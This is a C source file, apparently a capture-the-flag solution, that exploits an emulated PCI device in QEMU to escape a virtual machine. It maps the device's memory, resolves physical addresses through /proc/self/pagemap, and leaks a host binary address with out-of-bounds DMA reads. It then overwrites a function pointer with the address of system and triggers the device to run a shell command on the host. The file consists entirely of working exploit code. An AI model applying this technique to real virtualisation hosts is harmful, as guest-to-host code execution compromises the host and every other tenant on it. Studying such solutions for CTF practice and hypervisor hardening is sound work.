//  musl-gcc -static -s -Os ./solve.c -o solve
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <assert.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <fcntl.h>
#include <inttypes.h>

#define DMA_BASE 0x40000
 
int fd;
unsigned char* iomem; 
unsigned char* dmabuf;
size_t dmabuf_phys_addr;
 
#define PAGE_SHIFT  12
#define PAGE_SIZE   (1 << PAGE_SHIFT)
#define PFN_PRESENT (1ull << 63)
#define PFN_PFN     ((1ull << 55) - 1)
 
uint32_t page_offset(uint32_t addr)
{
    return addr & ((1 << PAGE_SHIFT) - 1);
}
 
size_t gva_to_gfn(void *addr)
{
    size_t pme, gfn;
    size_t offset;
    offset = ((uintptr_t)addr >> 9) & ~7;
    lseek(fd, offset, SEEK_SET);
    read(fd, &pme, 8);
    if (!(pme & PFN_PRESENT))
        return -1;
    gfn = pme & PFN_PFN;
    return gfn;
}
 
size_t gva_to_gpa(void *addr)
{
    size_t gfn = gva_to_gfn(addr);
    assert(gfn != -1);
    return (gfn << PAGE_SHIFT) | page_offset((size_t)addr);
}
 
void iowrite(size_t addr, size_t value)
{
    *((size_t*)(iomem + addr)) = value;
}
 
size_t ioread(size_t addr)
{
    return *((size_t*)(iomem + addr));
}
 
void dma_setcnt(uint32_t cnt)
{
    iowrite(0x90, cnt);
}
 
void dma_setdst(uint32_t dst)
{
    iowrite(0x88, dst);
}
 
void dma_setsrc(uint32_t src)
{
    iowrite(0x80, src);
}
 
void dma_start(uint32_t cmd)
{
    iowrite(0x98, cmd | 1);
}
 
 
void* dma_read(size_t addr, size_t len)
{
    dma_setsrc(addr);
    dma_setdst(dmabuf_phys_addr);
    dma_setcnt(len);
 
    dma_start(2);
    sleep(1);
}
 
void dma_write(size_t addr, void* buf, size_t len)
{
    assert(len < 0x1000);
    memcpy(dmabuf, buf, len);
 
    dma_setsrc(dmabuf_phys_addr);
    dma_setdst(addr);
    dma_setcnt(len);
 
    dma_start(0);
 
    sleep(1);
}
 
void dma_write_qword(size_t addr, size_t value)
{
    dma_write(addr, &value, 8);
}
 
size_t dma_read_qword(size_t addr)
{
    dma_read(addr, 8);
    return *((size_t*)dmabuf);
}
 
void dma_crypted_read(size_t addr, size_t len)
{
    dma_setsrc(addr);
    dma_setdst(dmabuf_phys_addr);
    dma_setcnt(len);
 
    dma_start(4 | 2);
 
    sleep(1);
}
 
int main(int argc, char *argv[])
{
    int fdmem = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
    iomem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fdmem, 0);
    fd = open("/proc/self/pagemap", O_RDONLY);
    printf("iomem @ %p\n", iomem);
     
    dmabuf = malloc(0x1000);
    memset(dmabuf, '\x00', sizeof(dmabuf));
    dmabuf_phys_addr = gva_to_gpa(dmabuf);
 
    printf("DMA buffer (virt) @ %p\n", dmabuf);
    printf("DMA buffer (phys) @ %p\n", (void*)dmabuf_phys_addr);
     
    size_t hitb_enc = dma_read_qword(DMA_BASE + 0x1000);
    size_t binary = hitb_enc - 0x283dd0;
    printf("binary @ 0x%lx\n", binary);
    size_t system = binary + 0x1fdb18;
 
    dma_write_qword(DMA_BASE + 0x1000, system);
    /* char* cmd= argv[1]; */
    char *cmd = "uname -a";
 
    dma_write(DMA_BASE + 0x100, cmd, strlen(cmd));
 
    dma_crypted_read(DMA_BASE + 0x100, 0x1);
 
    return 0;
}
